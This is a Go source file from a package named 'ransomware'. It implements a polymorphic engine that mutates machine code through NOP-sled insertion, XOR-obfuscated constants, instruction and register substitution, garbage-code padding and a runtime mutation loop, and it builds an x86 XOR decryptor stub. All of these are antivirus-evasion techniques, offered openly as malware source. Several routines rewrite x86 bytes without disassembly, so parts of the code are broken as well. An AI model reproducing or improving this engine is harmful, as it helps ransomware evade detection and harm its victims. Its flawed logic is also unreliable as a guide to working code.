package ransomware

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"math/big"
	"runtime"
	"strings"
	"sync"
	"time"
	"unsafe"
)

type JITPolymorphism struct {
	config     *RansomwareConfig
	mutations  int
	lastHash   string
	mutateLock sync.Mutex
}

type MutationPass struct {
	Name       string
	Transform  func([]byte) []byte
	Reversible bool
}

func NewJITPolymorphism(cfg *RansomwareConfig) *JITPolymorphism {
	return &JITPolymorphism{
		config:    cfg,
		mutations: 0,
	}
}

func (j *JITPolymorphism) InsertNOPsleds(code []byte, density int) []byte {
	if density < 1 {
		density = 1
	}
	if density > 50 {
		density = 50
	}

	var result []byte

	nopVariants := [][]byte{
		{0x90},
		{0x66, 0x90},
		{0x0F, 0x1F, 0x00},
		{0x0F, 0x1F, 0x40, 0x00},
		{0x0F, 0x1F, 0x44, 0x00, 0x00},
		{0x66, 0x66, 0x90},
		{0x66, 0x66, 0x66, 0x90},
		{0x48, 0x87, 0xC0},
	}

	for i, b := range code {
		result = append(result, b)
		if i%density == 0 && i > 0 {
			n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(nopVariants))))
			result = append(result, nopVariants[n.Int64()]...)
		}
	}

	return result
}

func (j *JITPolymorphism) ObfuscateConstants(code []byte) []byte {
	result := make([]byte, len(code))
	copy(result, code)

	patterns := detectConstants(code)
	for _, pat := range patterns {
		if pat.size <= 8 && pat.offset+pat.size <= len(result) {
			key := byte(j.mutations%256) + 1
			for i := 0; i < pat.size; i++ {
				result[pat.offset+i] ^= key
			}
		}
	}

	return result
}

type constPattern struct {
	offset int
	size   int
	value  uint64
}

func detectConstants(code []byte) []constPattern {
	var patterns []constPattern
	seen := make(map[uint64]bool)

	for i := 0; i < len(code)-3; i++ {
		for size := 1; size <= 8 && i+size <= len(code); size++ {
			val := uint64(0)
			for k := 0; k < size; k++ {
				val = val<<8 | uint64(code[i+k])
			}
			if val > 0xFF && !seen[val] {
				seen[val] = true
				patterns = append(patterns, constPattern{i, size, val})
				i += size - 1
				break
			}
		}
		if len(patterns) > 50 {
			break
		}
	}

	return patterns
}

func (j *JITPolymorphism) CodeCrossover(codeA, codeB []byte) []byte {
	if len(codeA) < 64 || len(codeB) < 64 {
		return codeA
	}

	minLen := len(codeA)
	if len(codeB) < minLen {
		minLen = len(codeB)
	}

	crossover := make([]byte, minLen)
	copy(crossover, codeA)

	nPoints, _ := rand.Int(rand.Reader, big.NewInt(int64(minLen/16-1)))
	crossoverPoints := int(nPoints.Int64()) + 1

	for c := 0; c < crossoverPoints; c++ {
		point, _ := rand.Int(rand.Reader, big.NewInt(int64(minLen-16)))
		pos := int(point.Int64()) + 8
		segLen := 4

		for i := 0; i < segLen && pos+i < minLen; i++ {
			crossover[pos+i] = codeB[pos+i]
		}
	}

	return crossover
}

func (j *JITPolymorphism) RegisterReordering(code []byte) []byte {
	if len(code) < 32 {
		return code
	}

	regMap := map[byte]byte{
		0xC0: 0xC8, 0xC1: 0xC9, 0xC2: 0xD0, 0xC3: 0xD1,
		0xC8: 0xC0, 0xC9: 0xC1,
	}

	result := make([]byte, len(code))
	copy(result, code)

	for i := 0; i < len(result)-2; i++ {
		if newReg, ok := regMap[result[i]]; ok {
			if result[i+1] == 0x00 && result[i+2] == 0x00 {
				result[i] = newReg
			}
		}
	}

	return result
}

func (j *JITPolymorphism) InstructionSubstitution(code []byte) []byte {
	subs := map[byte][]byte{
		0x50: {0x48, 0xFF, 0xC4, 0x90},
		0x58: {0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08},
		0x90: {0x0F, 0x1F, 0x00},
	}

	result := make([]byte, 0, len(code)*2)
	for _, b := range code {
		if replacement, ok := subs[b]; ok {
			result = append(result, replacement...)
		} else {
			result = append(result, b)
		}
	}

	return result
}

func (j *JITPolymorphism) GarbageCodeInsertion(code []byte, garbagePercent int) []byte {
	if garbagePercent < 1 {
		garbagePercent = 1
	}
	if garbagePercent > 20 {
		garbagePercent = 20
	}

	garbageSeqs := [][]byte{
		{0x48, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0x48, 0xFF, 0xC8},
		{0x48, 0x89, 0xE0, 0x48, 0x83, 0xC0, 0x00},
		{0xB8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0},
		{0x31, 0xC0, 0x48, 0x01, 0xC0, 0x48, 0x29, 0xC0},
	}

	var result []byte
	for i, b := range code {
		result = append(result, b)
		if i%(100/garbagePercent) == 0 && i > 0 {
			n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(garbageSeqs))))
			result = append(result, garbageSeqs[n.Int64()]...)
		}
	}

	return result
}

func (j *JITPolymorphism) EncryptDecryptSections(code []byte) []byte {
	sectionSize := 256
	result := make([]byte, len(code))
	copy(result, code)

	if len(code) < sectionSize*2 {
		return result
	}

	key := byte(time.Now().UnixNano() % 256)
	startOffset := sectionSize * (1 + j.mutations%3)

	for i := startOffset; i < startOffset+sectionSize && i < len(result); i++ {
		result[i] ^= key
	}

	return result
}

func (j *JITPolymorphism) MutateCode(code []byte) ([]byte, string) {
	j.mutateLock.Lock()
	defer j.mutateLock.Unlock()

	j.mutations++

	mutations := []MutationPass{
		{"NOPsleds", func(c []byte) []byte { return j.InsertNOPsleds(c, 8) }, false},
		{"ConstObfuscate", j.ObfuscateConstants, false},
		{"RegisterReorder", j.RegisterReordering, true},
		{"InstructionSub", j.InstructionSubstitution, true},
		{"GarbageCode", func(c []byte) []byte { return j.GarbageCodeInsertion(c, 10) }, false},
	}

	perm := []int{0, 1, 2, 3, 4}
	n, _ := rand.Int(rand.Reader, big.NewInt(5))
	perm[0], perm[n.Int64()] = perm[n.Int64()], perm[0]
	n, _ = rand.Int(rand.Reader, big.NewInt(5))
	perm[1], perm[n.Int64()] = perm[n.Int64()], perm[1]

	mutated := make([]byte, len(code))
	copy(mutated, code)

	var appliedMutations []string
	for _, idx := range perm {
		mutation := mutations[idx]
		mutated = mutation.Transform(mutated)
		appliedMutations = append(appliedMutations, mutation.Name)
	}

	hash := sha256.Sum256(mutated)
	mutationHash := fmt.Sprintf("%x", hash[:8])
	j.lastHash = mutationHash

	return mutated, fmt.Sprintf("mutations: %s", strings.Join(appliedMutations, " -> "))
}

func (j *JITPolymorphism) RuntimeMutationLoop(code []byte, interval time.Duration) chan []byte {
	ch := make(chan []byte, 10)

	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		current := make([]byte, len(code))
		copy(current, code)

		for {
			select {
			case <-ticker.C:
				mutated, _ := j.MutateCode(current)
				copy(current, mutated)
				ch <- mutated
			}
		}
	}()

	return ch
}

func (j *JITPolymorphism) PolymorphicDecryptor(encPayload []byte, counter int) []byte {
	key := byte(counter % 256)

	decryptor := []byte{
		0x48, 0x8D, 0x35, 0x10, 0x00, 0x00, 0x00,
		0xB9, byte(len(encPayload) & 0xFF), byte((len(encPayload) >> 8) & 0xFF),
		byte((len(encPayload) >> 16) & 0xFF), byte((len(encPayload) >> 24) & 0xFF),
		0x30, 0x1E,
		0x48, 0xFF, 0xC6,
		0xE2, 0xF9,
		0xE9, 0x00, 0x00, 0x00, 0x00,
	}

	for i := 0; i < 256; i++ {
		keyVariant := byte((int(key) + i) % 256)
		decVariant := make([]byte, len(decryptor))
		copy(decVariant, decryptor)
		decVariant[9] = keyVariant

		if keyVariant == key {
			return decVariant
		}
	}

	return decryptor
}

func (j *JITPolymorphism) GenerateWatermark(code []byte, marker string) []byte {
	hash := crc32.ChecksumIEEE([]byte(marker))
	watermark := make([]byte, 8)
	binary.LittleEndian.PutUint32(watermark[0:4], hash)

	result := make([]byte, len(code)+8)
	copy(result, code)
	copy(result[len(code):], watermark)

	return result
}

func (j *JITPolymorphism) VerifyWatermark(code []byte, marker string) bool {
	if len(code) < 8 {
		return false
	}

	expected := crc32.ChecksumIEEE([]byte(marker))
	watermark := binary.LittleEndian.Uint32(code[len(code)-8:])

	return watermark == expected
}

func (j *JITPolymorphism) FullJITSuite(testCode string) map[string]interface{} {
	result := make(map[string]interface{})

	code := []byte(testCode)
	if len(code) < 64 {
		code = append(code, bytes.Repeat([]byte{0x90}, 64-len(code))...)
	}

	mutated, desc := j.MutateCode(code)
	result["original_size"] = len(code)
	result["mutated_size"] = len(mutated)
	result["mutation_desc"] = desc
	result["hash"] = j.lastHash
	result["mutations_applied"] = j.mutations
	result["platform"] = runtime.GOOS

	crossoverCode := j.CodeCrossover(code, mutated)
	result["crossover_size"] = len(crossoverCode)

	decryptor := j.PolymorphicDecryptor(code, j.mutations)
	result["decryptor_size"] = len(decryptor)

	watermarked := j.GenerateWatermark(code, "X404X-JIT")
	result["watermark_valid"] = j.VerifyWatermark(watermarked, "X404X-JIT")

	return result
}

var (
	_ = base64.StdEncoding
	_ = unsafe.Sizeof(0)
	_ = sync.Mutex{}
)
